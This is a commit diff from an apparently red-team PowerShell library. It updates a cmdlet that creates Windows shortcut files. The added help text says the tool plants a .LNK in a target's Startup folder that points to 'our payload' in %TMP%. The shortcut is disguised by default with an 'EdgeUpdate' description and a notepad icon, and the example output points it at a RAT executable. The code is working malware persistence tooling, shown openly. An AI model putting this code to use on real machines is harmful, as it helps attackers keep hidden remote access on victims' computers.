6ae152baec9cfcf173c7f7f0826e628439e3ab22
pedro ubuntu <r00t-3xp10it@users.noreply.github.com>
2024-02-09 11:30:23 +0000

    redpill v1.2.6 - RedTeam database library

--- lib/Out-FileFormat/Out-shortcut.ps1
+++ lib/Out-FileFormat/Out-shortcut.ps1
@@ -1,22 +1,23 @@
 <#
 .SYNOPSIS
+   Create a shortcut file that accepts cmdline args.
 
    Author: @r00t-3xp10it
    Tested Under: Windows 10 (19042) x64 bits
    Required Dependencies: none
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.0.1
+   PS cmdlet Dev version: v1.0.2
 
 .DESCRIPTION
-	Creates an shortcut file that accepts cmdline arguments to execute.
-
-.NOTES
+   Creates an shortcut file that accepts cmdline arguments to execute.
+   THis cmdlet can be used to create one .LNK file on target startup
+   folder that points to our payload.exe|.bat|.ps1 stored on %TMP% 
 
 .Parameter target
    The absolucte path of appl\script to execute (default: notepad.exe)
 
-.Parameter Args
-   The appl\script arguments to execute (default: false)
+.Parameter Arguments
+   The appl\script arguments to be executed (default: false)
 
 .Parameter shortcut
    The absolucte path where to create sortcut.lnk (default: Startup)
@@ -25,67 +26,88 @@
    The shortcut description field (default: EdgeUpdate)
 
 .Parameter wdirectory
-   The shortcut working directory (default: $Env:TMP)
+   This cmdlet working directory (default: $Env:TMP)
 
 .Parameter Icon
    The LNK file icon (default: notepad.exe)
 
 .EXAMPLE
-	PS> .\Out-Shortcut.ps1 -shortcut "$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" -target "$Env:TMP\SH.exe" -description "EdgeUpdate"
-    read contents from '$Env:TMP\SH.ps1', creates '$Env:TMP\SH.exe', creates shortcut pointing to '$Env:TMP\SH.exe' on startup folder
+   PS> .\Out-Shortcut.ps1 -shortcut "$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" -target "$Env:TMP\SH.exe" -description "EdgeUpdate"
+   create shortcut of '$Env:TMP\SH.exe' PE on startup folder with 'EdgeUpdate' shortcut description
+   
+.EXAMPLE
+   PS> .\Out-Shortcut.ps1 -shortcut "$pwd" -target "$Env:TMP\auxiliary.ps1" -Arguments "-action 'query'"
+   create shortcut of '$Env:TMP\auxiliary.ps1' (with arguments) on current folder   
 
 .OUTPUTS
    * Created new shortcut : 'C:\Users\pedro\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Rat-x64.lnk'
-     => Target application: 'C:\Users\pedro\AppData\Local\Temp\Rat-x64.exe'
+     => Target application: 'C:\Users\pedro\AppData\Local\Temp\Rat-x64.exe'
 
 .LINK
 	https://github.com/fleschutz/PowerShell
 #>
 
 
-
-# $target = "$Env:WINDIR\System32\notepad.exe"
-# $shortcut = "$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
-
-
-
-#CmdLet Global variable declarations!
+## CmdLet Global variable declarations!
 [CmdletBinding(PositionalBinding=$false)] param(
    [string]$shortcut="$Env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
    [string]$target="$Env:WINDIR\System32\notepad.exe",
    [string]$Icon="$Env:WINDIR\System32\notepad.exe",
    [string]$description="EdgeUpdate",
    [string]$Wdirectory="$Env:TMP",
-   [string]$Args="False"
+   [string]$Arguments="False"
 )
 
 
 Write-Host ""
 ## Check cmdlet mandatory dependencies
+$ErrorActionPreference = "SilentlyContinue"
 If($target -iNotMatch '(.exe|.ps1|.bat)$')
 {
-   Write-Host "Error: -target only accepts 'exe,ps1,bat' extensions!" -ForegroundColor Red
-   exit #Exit @new-shortcut
+   write-host "x " -ForegroundColor Red -NoNewline
+   write-host " Error: -target only accepts '" -ForegroundColor DarkGray -NoNewline
+   write-host "exe,ps1,bat" -ForegroundColor Red -NoNewline
+   write-host "' extensions." -ForegroundColor DarkGray
+   return
+}
+If(-not(Test-Path -Path "$target"))
+{
+   write-host "x " -ForegroundColor Red -NoNewline
+   write-host " Notfound: '" -ForegroundColor DarkGray -NoNewline
+   write-host "$target" -ForegroundColor Red -NoNewline
+   write-host "'`n" -ForegroundColor DarkGray
+   return
 }
 If(-not($Wdirectory))
 {
-   Write-Host "Error: -Wdirectory '$Wdirectory' not found!" -ForegroundColor Red
-   New-Item -Name "$Wdirectory" -ItemType folder -Force
+   write-host "+ " -ForegroundColor Darkellow -NoNewline
+   write-host " Notfound: '" -ForegroundColor DarkGray -NoNewline
+   write-host "$Wdirectory" -ForegroundColor Red -NoNewline
+   write-host "'`n" -ForegroundColor DarkGray
+   New-Item -Name "$Wdirectory" -ItemType folder -Force|Out-Null
 }
 
 
 ## Split path to extract last string
 $RawTargetName = $target.Split('\')[-1] -replace '(.exe|.ps1|.bat)$','' # notepad
-$FinalName = "$shortcut"+"\$RawTargetName.lnk" -Join '' # C:\Users\pedro\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\notepad.lnk
+$FinalName = "$shortcut"+"\$RawTargetName.lnk" -Join '' # C:\Users\pedro\AppData\Roaming\Microsoft\Windows\...\...\...\notepad.lnk
 
+If(Test-Path -Path "$FinalName")
+{
+   write-host "x " -ForegroundColor Red -NoNewline
+   write-host " Duplicate entry detected: '" -ForegroundColor DarkGray -NoNewline
+   write-host "$FinalName" -ForegroundColor Red -NoNewline
+   write-host "'`n" -ForegroundColor DarkGray
+   return
+}
 
 try{
+
    $WScriptShell = New-Object -ComObject WScript.Shell
    $Sh = $WScriptShell.CreateShortcut("$FinalName")
-
    If($target -iMatch '(.ps1)$')
    {
-      If($Args -ieq "False")
+      If($Arguments -ieq "False")
       {
          $Sh.TargetPath = "$PSHOME\Powershell.exe"
          $Sh.Arguments = "-File $target" ## <-- shortcut cmdline arguments!
@@ -93,12 +115,12 @@ try{
       Else
       {
          $Sh.TargetPath = "$PSHOME\Powershell.exe"
-         $Sh.Arguments = "-File $target $Args" ## <-- shortcut cmdline arguments!      
+         $Sh.Arguments = "-File $target $Arguments" ## <-- shortcut cmdline arguments!      
       }
    }
-   ElseIf($target -iMatch '(.bat)$')
+   ElseIf($target -iMatch '(.bat|.exe)$')
    {
-      If($Args -ieq "False")
+      If($Arguments -ieq "False")
       {
          $Sh.TargetPath = "cmd.exe"
          $Sh.Arguments = "/c start $target" ## <-- shortcut cmdline arguments!
@@ -106,44 +128,32 @@ try{
       Else
       {
          $Sh.TargetPath = "cmd.exe"
-         $Sh.Arguments = "/c start $target $Args" ## <-- shortcut cmdline arguments!      
-      }
-   }
-   ElseIf($target -iMatch '(.exe)$')
-   {
-      If($Args -ieq "False")
-      {
-         $Sh.TargetPath = "cmd.exe"
-         $Sh.Arguments = "/c start $target" ## <-- shortcut cmdline arguments!
-      }
-      Else
-      {
-         $Sh.TargetPath = "cmd.exe"
-         $Sh.Arguments = "/c start $target $Args" ## <-- shortcut cmdline arguments!      
+         $Sh.Arguments = "/c start $target $Arguments" ## <-- shortcut cmdline arguments!      
       }
    }
    Else
    {
-      If($Args -ieq "False")
+      If($Arguments -ieq "False")
       {
          $Sh.TargetPath = "$target"
       }
       Else
       {
          $Sh.TargetPath = "$target"
-         $Sh.Arguments = "$Args" ## <-- shortcut cmdline arguments!      
+         $Sh.Arguments = "$Arguments" ## <-- shortcut cmdline arguments!      
       }
    }
-
+   
    $Sh.WindowStyle = "1"
    $Sh.WorkingDirectory = "$Wdirectory"
    $Sh.Description = "$description"
    $Sh.IconLocation = "$Icon, 0"
    $Sh.Save()
 
-   Write-Host "`n* Created new shortcut : '$FinalName'" -ForegroundColor Green
-   Write-Host "  => Target application: '$target'" -ForegroundColor Blue
+   Write-Host "`n* Created new shortcut : '$FinalName'" -ForegroundColor Green
+   Write-Host "  => Target application: '$target'" -ForegroundColor Blue
 }catch{
+   #Error creating shortcut!
    Write-Error "`nError in line $($_.InvocationInfo.ScriptLineNumber): $($Error[0])"
 }
 Write-Host ""
